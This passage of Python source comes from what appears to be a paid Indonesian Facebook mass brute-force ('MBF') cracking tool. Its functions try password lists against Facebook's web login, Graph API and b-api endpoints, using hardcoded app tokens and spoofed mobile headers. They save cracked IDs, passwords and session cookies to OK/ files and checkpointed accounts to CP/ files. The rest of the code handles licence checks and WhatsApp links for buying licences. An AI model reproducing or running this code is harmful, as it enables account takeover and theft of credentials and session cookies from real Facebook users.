			po = ses.post(f'https://{url}/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=head,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				tree = Tree("")
				tree.add(f"{K2}{idf}|{pw}")
				tree.add(f"{K2}{ua}")
				prints(tree)
				open('CP/'+cpc,'a').write(idf+' • '+pw+'\n')
				akun.append(idf+' • '+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				tree = Tree("")
				tree.add(f"{H2}{idf}|{pw}")
				tree.add(f"{H2}{kuki} | {ua}")
				prints(tree)
				open('OK/'+okc,'a').write(idf+' • '+pw+'\n')
				cek_apk(session,coki)
				break				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1

###----------[ METODE GRAPH ]---------- ###
def Api(idf,pwv):
	global loop,ok,cp
	prog.update(des,description=f"{H2}CRACK {P2}| {str(loop)}/{len(id2)} {P2}OK-:{H2}{ok} {P2}CP-:{K2}{cp}")
	prog.advance(des)
	xcUA = random.choice(uaMainXD)
	ses = requests.Session()
	for pw in pwv:
		try:
			ykh = random.randint(2e7, 3e7)
			iyh = random.randint(2e4, 4e4)
			head = {'Host':'graph.facebook.com','x-fb-connection-bandwidth': repr(ykh), 'x-fb-sim-hni': repr(iyh), 'x-fb-net-hni': repr(iyh),'x-fb-connection-quality': 'EXCELLENT','user-agent': ua_efbi(),'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
			date = {'access_token': '200424423651082|2a9918c6bcd75b94cefcbb5635c6ad16',  'format': 'JSON', 'sdk_version': {random.randrange(2, 31)}, 'email': idf, 'locale': 'ja_JP', 'password': pw, 'sdk': 'android', 'generate_session_cookies': '1', 'sig': f'{random.randrange(1, 9)}f{random.randrange(100, 999)}f{random.randrange(10, 99)}fb{random.randrange(10, 99)}fcd{random.randrange(1, 9)}aa{random.randrange(0, 9)}c{random.randrange(10, 99)}f{random.randrange(10, 99)}f{random.randrange(100, 999)}ef{random.randrange(1, 9)}'}
			xnxx = ses.post("https://graph.facebook.com/auth/login", params=date, headers=head, allow_redirects=False)
			anjg = json.loads(xnxx.text)
			if "session_key" in xnxx.text:
				ok+=1
				coki = anjg["session_cookies"]
				cok = {}
				for x in coki:
					cok.update({x["name"]:x["value"]})
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in cok.items() ])
				idf = re.findall('c_user=(.*);xs', kuki)[0]
				tree = Tree("                                 ")
				tree.add(f"{H2}{idf}|{pw}")
				tree.add(f"{H2}{kuki} | {xcUA}")
				prints(tree)
				open('OK/'+okc,'a').write("  * --> %s|%s|%s\n"%(idf,pw,kuki))
				ok.append(idf)
				break
			elif "checkpoint" in xnxx.text:
				cp+=1
				#idf = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
				tree = Tree("                                 ")
				tree.add(f"{K2}{idf}|{pw}")
				tree.add(f"{K2}{xcUA}")
				prints(tree)
				open('CP/'+cpc,'a').write("  * --> %s|%s\n"%(idf,pw))
				cp.append(idf)
				break				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1

###----------[ METODE APIV2 ]---------- ###
def metode_api(idf,pwv):
	global ok,cp,loop
	ugent,device,appver,versi = useragent()
	prog.update(des,description=f"crack {str(loop)}/{len(id2)} {P2}OK-:{H2}{ok} {P2}CP-:{K2}{cp}")
	prog.advance(des)
	try:
		for pw in pwv:
			headers = {
				"Host": "b-api.facebook.com",
				"user-agent": ugent,
				"Accept-Encoding": "gzip, deflate",
				"connection": "keep-alive",
				"Authorization": "OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32",
				"x-fb-sim-hni": str(random.randint(20000, 40000)),
				"x-fb-net-hni": str(random.randint(20000, 40000)),
				"x-fb-connection-bandwidth": str(random.randint(20000000, 30000000)),
				"X-FB-Connection-Quality": "EXCELLENT",
				"X-FB-Connection-Type": "mobile.CTRadioAccessTechnologyLTE",
				"X-Fb-Net-Sid": "",
				"x-fb-http-engine": "Liger",
				#"x-fb-friendly-name": "",
				"Content-Type": "application/x-www-form-urlencoded"
				}
			data = {
				"adid": str(uuid.uuid4()),
				"email": idf,
				"password": pw,
				"cpl": "true",
				"credentials_type": "password",
				"error_detail_type": "button_with_disabled",
				"source": "login",
				"format": "json",
				"device_id": str(uuid.uuid4()),
				"family_device_id": str(uuid.uuid4()),
				"generate_session_cookies": "1",
				"generate_analytics_claim": "1",
				"generate_machine_id": "1",
				"tier": "regular",
				"device": device,
				"os_ver": versi,
				"carrier": "AT%26T",
				"app_id": "350685531728",
				"app_ver": appver,
				"locale": "en_CU",
				"client_country_code": "CU",
				"advertising_id": str(uuid.uuid4()),
				"fb_api_req_friendly_name": "authenticate",
				"fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
				#"access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32"
				}
			post = ses.post("https://b-api.facebook.com/auth.login",data=data,headers=headers,allow_redirects=False)
			if "session_key" in post.text and "EAA" in post.text:
				ok.append(idf)
				coki = ";".join(i["name"]+"="+i["value"] for i in post.json()["session_cookies"])
				tree = Tree("                                 ")
				tree.add(f"\r{H2}{idf}|{pw}{P2} ")
				tree.add(f"{H2}{coki}{P2}")
				prints(tree)
				open('OK/'+okc,'a').write("  * --> %s|%s|%s\n"%(idf,pw,kuki))
				break
			elif "User must verify their account" in post.text:
				cp.append(idf)
				tree = Tree("                                 ")
				tree.add(f"\r{K2}{idf}|{pw}{P2} ")
				prints(tree)
				open('CP/'+cpc,'a').write("  * --> %s|%s\n"%(idf,pw))
				break
		loop+=1
	except requests.exceptions.ConnectionError:
		sleep(32)

###----------[ CEK LISENSI ]---------- ###
def key():
	os.system("clear");banner();key = input(f" {K}#{P} masukan lisensi : {H}")
	try:ses = requests.Session();asu = ses.get("https://app.cryptolens.io/api/key/Activate?token===&ProductId=18075&Key=%s&Sign=True"%(key)).json()['licenseKey']['key'];open("data/lisensi.txt","w").write(key);prints(Panel(f"{P2}selamat lisensi yang anda masukan terdaftar ke server InstaAdtya",width=80,padding=(0,6),style=f"{color_table}"));time.sleep(4);menu()
	except KeyError:
		prints(Panel(f"{P2}lisensi kamu sudah kedaluwarsa silahkan beli lisensi ke admin",width=80,padding=(0,6),style=f"{color_table}"));os.system("rm -rf data/lisensi.txt");os.system("xdg-open https://wa.me/+6281221523195?text=assalamualaikum+bang+mau+beli+lisensi+crack+Instagram");time.sleep(2);exit()

###----------[ CEK LISENSI ]---------- ###
def cek():
	try:x=open("data/lisensi.txt","r").read()
	except FileNotFoundError:key()
	try:x = requests.get("https://app.cryptolens.io/api/key/Activate?token=WyIzMzUzNzgyNyIsIjdCY0phZlJGRTlJZDNiQmpXM3dTaHlLd1Vic05qTU81LzM0TTJRbVIiXQ==&ProductId=18075&Key=%s"%(x)).json()['licenseKey']['key'];menu()
	except KeyError:
		prints(Panel(f"{P2}lisensi kamu sudah kedaluwarsa silahkan beli lisensi ke admin",width=80,padding=(0,6),style=f"{color_table}"));os.system("rm -rf data/lisensi.txt");os.system("xdg-open https://wa.me/+6281221523195?text=assalamualaikum+bang+mau+beli+lisensi+crack+Instagram");time.sleep(2);exit()

###----------[ MASUK LISENSI ]---------- ###
def key():
	os.system("clear") 
	banner()
	prints(Panel(f"{P2}silahkan masukan lisensi tools agar bisa masuk ke tools Facebook MBF\njika anda belum mempunyai lisensi ketik {H2}beli {P2}untuk melihat harga lisensi",width=80,padding=(0,2),style=f"{color_table}"))
	key = console.input(f" {H2}•{P2} masukan lisensi : ")
	if key in ["beli","Beli","BELI"]:beli_bang()
	try:ses = requests.Session();asu = ses.get("https://app.cryptolens.io/api/key/Activate?token=WyIzMzUzNzgyNyIsIjdCY0phZlJGRTlJZDNiQmpXM3dTaHlLd1Vic05qTU81LzM0TTJRbVIiXQ==&ProductId=18075&Key=%s&Sign=True"%(key)).json()['licenseKey']['key'];open("data/lisensi.txt","w").write(key);prints(Panel(f"{H2}selamat lisensi yang anda masukan terdaftar ke server Facebook MBF",width=80,padding=(0,9),style=f"{color_table}"));time.sleep(3);menu()
	except KeyError:
		prints(Panel(f"{P2} lisensi yang anda masukan tidak terdaftar silahkan beli terlebih dahulu",width=80,padding=(0,1),style=f"{color_table}"));os.system("xdg-open https://wa.me/+6281221523195?text=assalamualaikum+bang+mau+beli+lisensi+crack+Instagram");time.sleep(2);exit()

###----------[ CEK LISENSI ]---------- ###				
def cek():
	try:x=open("data/lisensi.txt","r").read()
	except FileNotFoundError:key()
	try:x = requests.get("https://app.cryptolens.io/api/key/Activate?token=WyIzMzUzNzgyNyIsIjdCY0phZlJGRTlJZDNiQmpXM3dTaHlLd1Vic05qTU81LzM0TTJRbVIiXQ==&ProductId=18075&Key=%s"%(x)).json()['licenseKey']['key'];menu()
	except KeyError:
		prints(Panel(f"{P2}lisensi kamu sudah kedaluwarsa silahkan beli lisensi ke admin",width=80,padding=(0,6),style=f"{color_table}"));os.system("rm -rf data/lisensi.txt");os.system("xdg-open https://wa.me/+6281221523195?text=assalamualaikum+bang+mau+beli+lisensi+crack+Instagram");time.sleep(2);exit()

###----------[ BUY LISENSI ]---------- ###	
def beli_bang():
    prints(Panel(f"{P2}[{H2}01{P2}]. 1 minggu {H2}50.000 {P2}max pemakaian 1 device\n{P2}[{H2}02{P2}]. 1 bulan {H2}100.000{P2} max pemakaian 5 device\n{P2}[{H2}03{P2}]. open source full update {H2}450.000",width=80,padding=(0,15),style=f"{color_table}"))
    zxc = console.input(f" {H2}•{P2} pilih lisensi : ")
    if zxc in [""]:prints(f" {H2}•{P2} pilih yang bener broo jangan kosong");time.sleep(3);cek_lisensi_aktif()
    elif zxc in ["1","01"]:prints(f" {H2}•{P2} anda akan di arahkan ke WhatsApp");os.system("xdg-open https://wa.me/+6281221523195?text=assalamualaikum+bang+mau+beli+lisensi+facebook+1+minggu");time.sleep(2);exit()
    elif zxc in ["2","02"]:prints(f" {H2}•{P2} anda akan di arahkan ke WhatsApp");os.system("xdg-open https://wa.me/+6281221523195?text=assalamualaikum+bang+mau+beli+lisensi+facebook+1+bulan");time.sleep(2);exit()
    elif zxc in ["3","03"]:prints(f" {H2}•{P2} anda akan di arahkan ke WhatsApp");os.system("xdg-open https://wa.me/+6281221523195?text=assalamualaikum+bang+mau+beli+lisensi+facebook+full+source");time.sleep(2);exit()
    else:prints(f" {H2}•{P2} ngetik apaan lu ngab");time.sleep(3);cek_lisensi_aktif()

###----------[ CEK LISENSI AKTIF ]---------- ###
def cek_lisensi_aktif():
	try:xz = open("data/lisensi.txt","r").read()
	except FileNotFoundError:key()
	os.system("clear");cek()

###----------[ AUTO CREATE FOLDER ]---------- ###
def AutoFolder():
    try:os.mkdir("OK")
    except:pass
    try:os.mkdir("CP")
    except:pass
    try:os.mkdir("data")
    except:pass
    try:os.mkdir("assets")
    except:pass

###----------[ PEMANGGIL ]---------- ###
if __name__=='__main__':
  try:
      with requests.Session() as ses:
           os.system("git pull")
           AutoFolder();menu()
  except requests.exceptions.ConnectionError:
      prints(f" {H2}•{P2} koneksi internet anda bermasalah")
      time.sleep(3);exit()
